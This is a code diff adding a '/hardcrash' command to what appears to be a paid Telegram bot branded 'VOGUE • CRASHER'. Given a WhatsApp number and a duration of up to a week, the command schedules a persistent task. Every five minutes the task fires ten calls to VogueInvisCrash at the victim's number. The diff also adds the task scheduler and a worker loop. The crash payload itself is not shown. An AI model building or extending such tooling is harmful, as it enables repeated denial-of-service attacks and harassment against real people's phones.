@@ -281,6 +281,7 @@ let reconnecting = false;
 let reconnectTimeout;
 let presenceInterval;
 let currentStyleIndex = 0;
+let workerStarted = false;
 const activeButtons = new Map();
 
 const hasClaimedFreePremium = (userId) => {
@@ -5758,6 +5759,227 @@ FAILED
         }
 });
 
+bot.command("hardcrash", checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
+
+        try {
+
+            const args =
+                ctx.message.text.split(" ");
+
+            const number =
+                args[1];
+
+            const duration =
+                args[2];
+
+            // =====================
+            // VALIDATION
+            // =====================
+
+            if (
+                !number ||
+                !duration
+            ) {
+
+                return ctx.reply(
+
+`
+━━━━━━━━━━━━━━━━━━━━━━
+V O G U E • MESSAGE
+━━━━━━━━━━━━━━━━━━━━━━
+
+Usage :
+/hardcrash number duration
+
+━━━━━━━━━━━━━━━━━━━━━━
+
+Example :
+/hardcrash 628xxxx 1h
+
+━━━━━━━━━━━━━━━━━━━━━━
+
+Supported Duration :
+
+◈ 1h
+◈ 1d
+◈ 1w
+
+━━━━━━━━━━━━━━━━━━━━━━
+`
+                );
+            }
+
+            // =====================
+            // PARSE DURATION
+            // =====================
+
+            const ms =
+                parseDuration(
+                    duration
+                );
+
+            if (!ms) {
+
+                return ctx.reply(
+                    "Invalid duration."
+                );
+            }
+
+            // =====================
+            // FORMAT TARGET
+            // =====================
+
+            const clean =
+                number.replace(
+                    /[^0-9]/g,
+                    ""
+                );
+
+            const target =
+                clean +
+                "@s.whatsapp.net";
+
+            // =====================
+            // LOAD TASKS
+            // =====================
+
+            const tasks =
+                loadTasks();
+
+            // =====================
+            // PREVENT DUPLICATE
+            // =====================
+
+            const exists =
+                tasks.find(
+                    x =>
+
+                    x.type ===
+                        "hardcrash"
+
+                    &&
+
+                    x.target ===
+                        target
+
+                    &&
+
+                    x.active
+                );
+
+            if (exists) {
+
+                return ctx.reply(
+
+`
+━━━━━━━━━━━━━━━━━━━━━━
+TASK ALREADY ACTIVE
+━━━━━━━━━━━━━━━━━━━━━━
+
+Target :
+${clean}
+
+━━━━━━━━━━━━━━━━━━━━━━
+`
+                );
+            }
+
+            // =====================
+            // CREATE TASK
+            // =====================
+
+            const task = {
+
+                id:
+                    Date.now(),
+
+                type:
+                    "hardcrash",
+
+                target,
+
+                number:
+                    clean,
+
+                interval:
+                    300000,
+
+                batch:
+                    10,
+
+                createdAt:
+                    Date.now(),
+
+                endTime:
+                    Date.now() + ms,
+
+                lastRun:
+                    0,
+
+                active:
+                    true
+            };
+
+            // =====================
+            // SAVE TASK
+            // =====================
+
+            tasks.push(task);
+
+            saveTasks(tasks);
+
+            // =====================
+            // SUCCESS MESSAGE
+            // =====================
+
+            await ctx.replyWithPhoto(
+                thumbnailUrl,
+
+                {
+                    caption:
+
+`\`\`\`ruby
+━━━━━━━━━━━━━━━━━━━━━━
+V O G U E • C R A S H E R
+━━━━━━━━━━━━━━━━━━━━━━
+
+〔 TASK CREATED 〕
+
+◈ Type :
+hardcrash
+
+◈ Target :
+${clean}
+
+◈ Duration :
+${duration}
+
+━━━━━━━━━━━━━━━━━━━━━━
+
+Task successfully added to persistent scheduler.
+
+━━━━━━━━━━━━━━━━━━━━━━
+
+System Status :
+ACTIVE
+\`\`\`
+`,
+                    parse_mode:
+                        "Markdown"
+                }
+            );
+
+        } catch (err) {
+
+            console.log(err);
+
+            ctx.reply(
+                `ERROR\n\n${err.message}`
+            );
+        }
+    }
+);
+
 //    ______ _   _ _   _ _____ _____ _____ _____ _   _ 
 //    |  ___| | | | \ | /  __ \_   _|_   _|  _  | \ | |
 //    | |_  | | | |  \| | /  \/ | |   | | | | | |  \| |
@@ -5774,6 +5996,66 @@ FAILED
 //    \____/ \___/ \____/                              
 //                                                     
 //
+
+const TASK_FILE =
+    "./sendtasks.json";
+
+function loadTasks() {
+    
+    if (
+        !fs.existsSync(TASK_FILE)
+    ) {
+        return [];
+    }
+    
+    return JSON.parse(
+        fs.readFileSync(
+            TASK_FILE,
+            "utf8"
+        )
+    );
+}
+
+function saveTasks(data) {
+    
+    fs.writeFileSync(
+        TASK_FILE,
+        
+        JSON.stringify(
+            data,
+            null,
+            2
+        )
+    );
+}
+
+function parseDuration(input) {
+    
+    const match =
+        input.match(
+            /^(\d+)(m|h|d|w)$/i
+        );
+    
+    if (!match) {
+        return null;
+    }
+    
+    const value =
+        parseInt(match[1]);
+    
+    const unit =
+        match[2].toLowerCase();
+    
+    const units = {
+        
+        m: 60000,
+        h: 3600000,
+        d: 86400000,
+        w: 604800000
+    };
+    
+    return value * units[unit];
+}
 
 function loadQueue() {
 
@@ -5841,6 +6123,174 @@ function compareVersions(v1, v2) {
     }
     
     return 0;
+}
+
+async function executeTask(task) {
+    switch (task.type) {
+
+        // =====================
+        // SEND MESSAGE
+        // =====================
+
+        case "hardcrash":
+
+            for (let i = 0;i < task.batch;i++) {
+                try {
+                    await VogueInvisCrash(sock, task.target);
+                    await sleep(1800);
+                } catch (e) {
+
+                    console.log(
+                        `[CRASH ERROR]
+${e.message}`
+                    );
+                }
+            }
+
+        break;
+
+        // =====================
+        // SEND IMAGE
+        // =====================
+
+        case "sendimage":
+
+            for (
+                let i = 0;
+                i < task.batch;
+                i++
+            ) {
+
+                try {
+
+                    await sendImage(
+                        sock,
+                        task.target
+                    );
+
+                    await sleep(1500);
+
+                } catch (e) {
+
+                    console.log(
+                        `[SENDIMAGE ERROR]
+${e.message}`
+                    );
+                }
+            }
+
+        break;
+
+        // =====================
+        // BACKUP
+        // =====================
+
+        case "backup":
+
+            try {
+
+                await runBackup();
+
+            } catch (e) {
+
+                console.log(
+                    `[BACKUP ERROR]
+${e.message}`
+                );
+            }
+
+        break;
+
+        // =====================
+        // DEFAULT
+        // =====================
+
+        default:
+
+            console.log(
+                `[UNKNOWN TASK]
+${task.type}`
+            );
+    }
+}
+
+async function startUniversalWorker() {
+    
+    if (workerStarted) {
+        return;
+    }
+
+    workerStarted = true;
+    
+    setInterval(async () => {
+        
+        let tasks =
+            loadTasks();
+        
+        let changed =
+            false;
+        
+        for (const task of tasks) {
+            
+            if (!task.active) {
+                continue;
+            }
+            
+            // expired
+            if (
+                Date.now() >=
+                task.endTime
+            ) {
+                
+                task.active = false;
+                
+                changed = true;
+                
+                console.log(
+                    `[TASK EXPIRED]
+${task.id}`
+                );
+                
+                continue;
+            }
+            
+            // interval check
+            if (
+                Date.now() -
+                task.lastRun <
+                task.interval
+            ) {
+                continue;
+            }
+            
+            try {
+                
+                console.log(
+                    `[TASK RUN]
+${task.type}`
+                );
+                
+                await executeTask(task);
+                
+                task.lastRun =
+                    Date.now();
+                
+                changed = true;
+                
+            } catch (err) {
+                
+                console.log(
+                    `[WORKER ERROR]
+${err.message}`
+                );
+            }
+        }
+        
+        if (changed) {
+            saveTasks(tasks);
+        }
+        
+    }, 10000);
 }
 
 async function restoreQueue() {
@@ -6590,5 +7040,7 @@ function generateKeyboard(clean) {
 //     \____/\_| \_\_| |_/\____/\_| |_/\____/\_| \_|
 //                                                  
 //
+
+startUniversalWorker();
 
 bot.launch()
